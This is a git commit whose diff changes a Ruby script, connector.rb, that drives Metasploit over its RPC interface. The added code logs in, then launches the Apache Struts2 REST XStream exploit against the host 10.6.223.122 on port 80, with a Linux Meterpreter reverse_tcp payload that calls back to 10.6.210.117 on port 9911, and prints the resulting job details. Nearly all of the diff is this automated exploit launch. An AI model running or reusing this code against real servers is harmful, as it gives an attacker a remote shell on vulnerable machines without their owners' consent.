471989be3c8564505c764691fa4b32e1ebd11dfe
sn0wf1llin <sn0wf1llin@gmail.com>
2019-09-30 17:51:42 +0300

    connector changed

--- connector.rb
+++ connector.rb
@@ -11,4 +11,23 @@ opts = {
 }
 rpc = Msf::RPC::Client.new(opts)
 rpc.login(user, pass)
-print rpc.call('core.version')
+puts rpc
+puts rpc.call('core.version')
+puts rpc.call('core.module_stats')
+
+# info exploit/multi/http/struts2_rest_xstream
+# puts rpc.call('module.options', 'exploit', 'multi/http/struts2_rest_xstream')
+
+exp_opts = {
+  'RHOST'     => '10.6.223.122',
+  'RPORT'     => 80,
+  'verbose'   => true
+}
+pay_opts = {
+  'PAYLOAD' => 'linux/x86/meterpreter/reverse_tcp',
+  'LHOST'   => '10.6.210.117',
+  'LPORT'   => 9911
+}
+job = rpc.call('module.execute', 'exploit', 'multi/http/struts2_rest_xstream', exp_opts.merge(pay_opts))
+puts job['job_id']
+puts rpc.call('job.info', job['job_id'])
